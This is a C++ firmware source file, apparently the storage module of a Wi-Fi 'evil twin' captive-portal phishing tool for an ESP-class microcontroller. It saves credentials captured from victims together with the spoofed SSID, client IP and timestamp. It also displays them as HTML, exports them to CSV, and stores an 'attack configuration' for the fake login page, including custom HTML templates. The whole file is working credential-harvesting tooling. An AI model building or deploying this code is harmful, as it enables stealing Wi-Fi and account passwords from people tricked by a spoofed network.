#include "storage.h"
#include "utils.h"
#include "config.h"

static String getCurrentTimestamp() {
    unsigned long t = millis() / 1000;
    char buf[20];
    sprintf(buf, "%02lu:%02lu:%02lu", (t / 3600) % 24, (t / 60) % 60, t % 60);
    return String(buf);
}

bool saveCredentials(const String& ssid, const String& data, const String& clientIp) {
    File f = SPIFFS.open(CRED_FILE_PATH, "a");
    if (!f) {
        Serial.println("[ERROR] Could not open credential file for writing");
        return false;
    }
    f.println(getCurrentTimestamp() + " | SSID: " + ssid + " | " + data + " | IP: " + clientIp);
    f.close();
    Serial.println("[SAVED] Credential recorded for SSID: " + ssid);
    return true;
}

String readCapturedCredentials() {
    if (!SPIFFS.exists(CRED_FILE_PATH)) {
        return "<p>No credentials captured yet.</p>";
    }
    File f = SPIFFS.open(CRED_FILE_PATH, "r");
    if (!f) return "<p>Error reading credential file.</p>";

    String html = "";
    while (f.available()) {
        String line = f.readStringUntil('\n');
        if (line.length() > 0) {
            html = "<div class='cred-box'><strong>" + line + "</strong></div>" + html;
        }
    }
    f.close();
    return html;
}

void wipeCredentialLog() {
    SPIFFS.remove(CRED_FILE_PATH);
    Serial.println("[INFO] Credential log cleared");
}

String loadHtmlTemplate(const String& filename) {
    String filepath = filename.startsWith("/") ? filename : "/" + filename;
    if (!SPIFFS.exists(filepath)) return "";

    File file = SPIFFS.open(filepath, "r");
    if (!file) return "";

    String content = file.readString();
    file.close();
    return content;
}

bool saveHtmlTemplate(const String& filename, const String& content) {
    String filepath = filename.startsWith("/") ? filename : "/" + filename;
    if (!filepath.endsWith(".html")) filepath += ".html";

    File file = SPIFFS.open(filepath, "w");
    if (!file) return false;

    file.print(content);
    file.close();
    return true;
}

std::vector<String> listHtmlTemplates() {
    std::vector<String> files;
    File root = SPIFFS.open("/");
    if (!root) return files;

    File file = root.openNextFile();
    while (file) {
        String fname = String(file.name());
        if (fname.endsWith(".html") || fname.endsWith(".htm")) {
            if (fname.startsWith("/")) fname = fname.substring(1);
            files.push_back(fname);
        }
        file = root.openNextFile();
    }
    return files;
}

static String escapeJsonString(const String& input) {
    String output;
    output.reserve(input.length() + 10);
    for (uint16_t i = 0; i < input.length(); i++) {
        char c = input.charAt(i);
        if (c == '"') output += "\\\"";
        else if (c == '\\') output += "\\\\";
        else if (c == '\n') output += "\\n";
        else if (c == '\r') output += "\\r";
        else if (c == '\t') output += "\\t";
        else output += c;
    }
    return output;
}

bool saveAttackConfig(const AttackProfile& config) {
    File file = SPIFFS.open(CONFIG_FILE_PATH, "w");
    if (!file) return false;

    file.println("{");
    file.println("  \"pageTitle\": \"" + escapeJsonString(config.pageTitle) + "\",");
    file.println("  \"pageSubtitle\": \"" + escapeJsonString(config.pageSubtitle) + "\",");
    file.println("  \"pageBody\": \"" + escapeJsonString(config.pageBody) + "\",");
    file.println("  \"customHtmlFile\": \"" + escapeJsonString(config.customHtmlFile) + "\",");
    file.println("  \"useCustomHtml\": " + String(config.useCustomHtml ? "true" : "false") + ",");
    file.println("  \"autoStopEnabled\": " + String(config.autoStopEnabled ? "true" : "false") + ",");
    file.println("  \"autoStopMinutes\": " + String(config.autoStopMinutes));
    file.println("}");
    file.close();
    Serial.println("[SAVED] Attack configuration persisted");
    return true;
}

static String readJsonString(File& file) {
    String result = "";
    bool inQuotes = false;
    bool escaped = false;
    char c;
    while (file.available()) {
        c = file.read();
        if (escaped) {
            result += c;
            escaped = false;
            continue;
        }
        if (c == '\\') {
            escaped = true;
            continue;
        }
        if (c == '"') {
            inQuotes = !inQuotes;
            if (!inQuotes) break;
            continue;
        }
        if (inQuotes) result += c;
    }
    return result;
}

static String readJsonRawValue(File& file) {
    String result = "";
    char c;
    while (file.available()) {
        c = file.read();
        if (c == ',' || c == '}' || c == '\n' || c == '\r') break;
        if (!isspace(c)) result += c;
    }
    return result;
}

bool loadAttackConfig(AttackProfile& config) {
    if (!SPIFFS.exists(CONFIG_FILE_PATH)) return false;

    File file = SPIFFS.open(CONFIG_FILE_PATH, "r");
    if (!file) return false;

    String line;
    while (file.available()) {
        line = file.readStringUntil('\n');
        line.trim();

        if (line.startsWith("\"pageTitle\"")) {
            config.pageTitle = readJsonString(file);
        } else if (line.startsWith("\"pageSubtitle\"")) {
            config.pageSubtitle = readJsonString(file);
        } else if (line.startsWith("\"pageBody\"")) {
            config.pageBody = readJsonString(file);
        } else if (line.startsWith("\"customHtmlFile\"")) {
            config.customHtmlFile = readJsonString(file);
        } else if (line.startsWith("\"useCustomHtml\"")) {
            config.useCustomHtml = (readJsonRawValue(file) == "true");
        } else if (line.startsWith("\"autoStopEnabled\"")) {
            config.autoStopEnabled = (readJsonRawValue(file) == "true");
        } else if (line.startsWith("\"autoStopMinutes\"")) {
            config.autoStopMinutes = (uint16_t)readJsonRawValue(file).toInt();
        }
    }
    file.close();
    Serial.println("[INFO] Attack configuration loaded from SPIFFS");
    return true;
}

String exportCredentialsAsCSV() {
    String csv = "Timestamp,SSID,Captured_Data,Client_IP\n";

    if (!SPIFFS.exists(CRED_FILE_PATH)) return csv;

    File f = SPIFFS.open(CRED_FILE_PATH, "r");
    if (!f) return csv;

    while (f.available()) {
        String line = f.readStringUntil('\n');
        if (line.length() == 0) continue;

        line.replace("\"", "\"\"");

        int fieldCount = 0;
        int lastPipe = -1;
        String timestamp = "";
        String ssid = "";
        String data = "";
        String ip = "";

        for (int i = 0; i <= line.length(); i++) {
            if (i == line.length() || line.charAt(i) == '|') {
                String segment = line.substring(lastPipe + 1, i);
                segment.trim();

                if (fieldCount == 0) timestamp = segment;
                else if (fieldCount == 1) ssid = segment.substring(6);
                else if (fieldCount == 2) data = segment;
                else if (fieldCount == 3) ip = segment.substring(4);

                fieldCount++;
                lastPipe = i;
            }
        }

        csv += "\"" + timestamp + "\",\"" + ssid + "\",\"" + data + "\",\"" + ip + "\"\n";
    }
    f.close();
    return csv;
}

unsigned long getScanAgeMinutes(unsigned long lastScanTime) {
    if (lastScanTime == 0) return 9999;
    unsigned long elapsed = millis() - lastScanTime;
    return elapsed / 60000UL;
}
